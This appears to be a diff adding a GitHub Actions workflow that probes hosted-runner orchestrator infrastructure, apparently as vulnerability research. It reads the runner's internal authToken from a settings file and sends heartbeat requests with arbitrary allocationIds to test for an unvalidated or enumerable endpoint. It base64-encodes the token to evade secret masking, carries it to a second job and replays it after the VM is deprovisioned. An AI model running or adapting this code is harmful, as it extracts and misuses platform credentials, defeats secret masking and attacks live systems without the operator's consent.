@@ -1,0 +1,135 @@
+name: v67 - heartbeat oracle + post-job token replay
+on:
+  workflow_dispatch:
+
+jobs:
+
+  oracle-and-extract:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 15
+    outputs:
+      token_b64:     ${{ steps.save.outputs.token_b64 }}
+      trace_url:     ${{ steps.save.outputs.trace_url }}
+      token_sha256:  ${{ steps.save.outputs.token_sha256 }}
+
+    steps:
+
+      - name: v67a - heartbeat oracle (random UUID vs own allocationId vs old dead allocationId)
+        continue-on-error: true
+        run: |
+          printf '%s\n' \
+            'import json, base64, subprocess, hashlib' \
+            's = json.load(open("/opt/hca/.settings"))' \
+            'token = s["authToken"]' \
+            'scheduler_url = s["schedulerApiUrl"]' \
+            'heartbeat_url = scheduler_url + "/request/heartbeat"' \
+            'payload_b64 = token.split(".")[1]' \
+            'padded = payload_b64 + "=" * (4 - len(payload_b64) % 4)' \
+            'payload = json.loads(base64.urlsafe_b64decode(padded))' \
+            'wid = payload.get("wid", "")' \
+            'parts = wid.strip("{}").split("}:{")' \
+            'own_alloc = parts[1] if len(parts) >= 2 else "UNKNOWN"' \
+            'print("=== HEARTBEAT ORACLE TEST ===")' \
+            'print("own_allocation_id=" + own_alloc)' \
+            'print("heartbeat_url=" + heartbeat_url)' \
+            'print("scheduler_region=" + payload.get("env", "unknown"))' \
+            'def hb(alloc, label):' \
+            '    r = subprocess.run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "-X", "PUT", heartbeat_url, "-H", "Authorization: Bearer " + token, "-H", "Content-Type: application/json", "-d", json.dumps({"allocationId": alloc})], capture_output=True, text=True)' \
+            '    code = r.stdout.strip()' \
+            '    print("heartbeat_" + label + "=" + code)' \
+            '    return code' \
+            'r1 = hb("deadbeef-dead-4ead-dead-deadbeefface", "random_nonexistent_uuid")' \
+            'r2 = hb(own_alloc, "own_live_alloc")' \
+            'r3 = hb("16e9d423-4332-46e4-a4b3-fd8b14c9330c", "old_dead_v62_alloc")' \
+            'r4 = hb("f04f8bdc-785a-45ea-ac70-c14b602e55c0", "old_dead_v47_alloc")' \
+            'print("=== ORACLE VERDICT ===")' \
+            'if r1 == r2 == "200":' \
+            '    print("ALL_200: endpoint accepts ANY allocationId including random/nonexistent UUIDs")' \
+            '    print("SEVERITY_ESCALATION: attacker needs no allocationId discovery — any value works")' \
+            '    print("This is worse than a simple IDOR: endpoint is completely unvalidated")' \
+            'elif r2 == "200" and r1 not in ("200",):' \
+            '    print("ORACLE_CONFIRMED: random=" + r1 + " own=" + r2 + " old_v62=" + r3)' \
+            '    print("Endpoint validates allocationId existence — differential enables enumeration")' \
+            '    print("Attacker can brute-force valid allocationIds via response oracle")' \
+            'else:' \
+            '    print("RESULT: random=" + r1 + " own=" + r2 + " old_v62=" + r3 + " old_v47=" + r4)' \
+            'if r3 == "200" or r4 == "200":' \
+            '    print("OLD_DEAD_ALLOC_ACCEPTED: expired allocationIds not cleaned up in orchestrator state")' \
+            'print("=== DONE ===")' \
+            > /tmp/v67a.py
+          python3 /tmp/v67a.py
+
+      - id: save
+        name: v67b - extract authToken + verify alive + save to outputs for post-job test
+        continue-on-error: true
+        run: |
+          # Extract values as base64 to avoid JWT pattern masking
+          TOKEN_B64=$(python3 -c "import json,base64; s=json.load(open('/opt/hca/.settings')); print(base64.b64encode(s['authToken'].encode()).decode())")
+          TRACE_URL=$(python3 -c "import json; s=json.load(open('/opt/hca/.settings')); print(s['traceApiUrl'])")
+          TOKEN_SHA256=$(python3 -c "import json,hashlib; s=json.load(open('/opt/hca/.settings')); print(hashlib.sha256(s['authToken'].encode()).hexdigest())")
+
+          echo "=== PRE-JOB-END BASELINE ==="
+          echo "pre_job_end_token_sha256=$TOKEN_SHA256"
+          echo "pre_job_end_trace_url=$TRACE_URL"
+
+          # Confirm the token works NOW while the VM is still alive
+          PRE_STATUS=$(python3 -c "
+          import json, subprocess
+          s = json.load(open('/opt/hca/.settings'))
+          payload = json.dumps([{'level':0,'message':'v67b-pre-job-end-baseline','timestamp':'2026-06-24T00:00:00Z'}])
+          r = subprocess.run(['curl','-s','-o','/dev/null','-w','%{http_code}','-X','POST',s['traceApiUrl'],'-H','Authorization: Bearer '+s['authToken'],'-H','Content-Type: application/json','-d',payload], capture_output=True, text=True)
+          print(r.stdout.strip())
+          ")
+          echo "pre_job_end_api_status=$PRE_STATUS"
+
+          # Save to GITHUB_OUTPUT for post-job-replay job
+          echo "token_b64=$TOKEN_B64" >> $GITHUB_OUTPUT
+          echo "trace_url=$TRACE_URL" >> $GITHUB_OUTPUT
+          echo "token_sha256=$TOKEN_SHA256" >> $GITHUB_OUTPUT
+          echo "token saved to GITHUB_OUTPUT — this VM will be deprovisioned when job ends"
+
+  post-job-replay:
+    runs-on: ubuntu-24.04
+    needs: oracle-and-extract
+    timeout-minutes: 10
+    env:
+      TOKEN_B64:    ${{ needs.oracle-and-extract.outputs.token_b64 }}
+      TRACE_URL:    ${{ needs.oracle-and-extract.outputs.trace_url }}
+      TOKEN_SHA256: ${{ needs.oracle-and-extract.outputs.token_sha256 }}
+
+    steps:
+
+      - name: v67c - replay dead VM authToken (post-VM-deprovisioning)
+        continue-on-error: true
+        run: |
+          printf '%s\n' \
+            'import json, base64, subprocess, hashlib, os' \
+            'token_b64 = os.environ["TOKEN_B64"]' \
+            'trace_url = os.environ["TRACE_URL"]' \
+            'expected_sha256 = os.environ["TOKEN_SHA256"]' \
+            'token = base64.b64decode(token_b64.encode()).decode()' \
+            'actual_sha256 = hashlib.sha256(token.encode()).hexdigest()' \
+            'print("=== POST-JOB TOKEN REPLAY TEST ===")' \
+            'print("sha256_verified=" + str(actual_sha256 == expected_sha256))' \
+            'print("token_sha256=" + actual_sha256)' \
+            'print("trace_url=" + trace_url)' \
+            'print("issuing_vm_status=DEPROVISIONED (oracle-and-extract job has ended)")' \
+            'payload = json.dumps([{"level":0,"message":"v67c-post-job-replay","timestamp":"2026-06-24T00:00:00Z"}])' \
+            'r = subprocess.run(["curl","-s","-o","/dev/null","-w","%{http_code}","-X","POST",trace_url,"-H","Authorization: Bearer " + token,"-H","Content-Type: application/json","-d",payload], capture_output=True, text=True)' \
+            'status = r.stdout.strip()' \
+            'print("post_job_replay_status=" + status)' \
+            'if status == "200":' \
+            '    print("TOKEN_SURVIVES_VM_DEATH=TRUE")' \
+            '    print("CRITICAL: authToken accepted by HCA orchestrator AFTER issuing VM was deprovisioned")' \
+            '    print("Stolen authToken has real post-exfiltration utility; no-exp claim is load-bearing")' \
+            '    print("An attacker who steals the token during a job retains access after the job ends")' \
+            'elif status in ("401","403"):' \
+            '    print("TOKEN_REVOKED_AT_VM_DEATH=TRUE")' \
+            '    print("Server-side revocation confirmed at VM deprovisioning")' \
+            '    print("Action: remove no-exp emphasis; note effective TTL = job lifetime")' \
+            '    print("Finding remains valid: authToken stolen mid-job, usable for full job duration")' \
+            'else:' \
+            '    print("UNEXPECTED_STATUS=" + status)' \
+            'print("=== DONE ===")' \
+            > /tmp/v67c.py
+          python3 /tmp/v67c.py
